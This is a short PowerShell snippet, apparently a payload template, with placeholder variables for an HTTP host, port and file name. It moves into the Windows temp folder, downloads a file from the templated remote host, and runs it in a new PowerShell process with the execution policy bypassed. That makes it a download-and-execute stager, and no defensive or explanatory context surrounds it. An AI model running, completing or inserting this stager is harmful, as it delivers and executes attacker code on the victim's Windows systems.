cd C:\windows\temp;
iwr -Uri "http://${http_ip}:${http_port}/${filename}" -OutFile "${filename}";
Start-Process -FilePath "powershell" -ArgumentList "-ep bypass ./${filename}";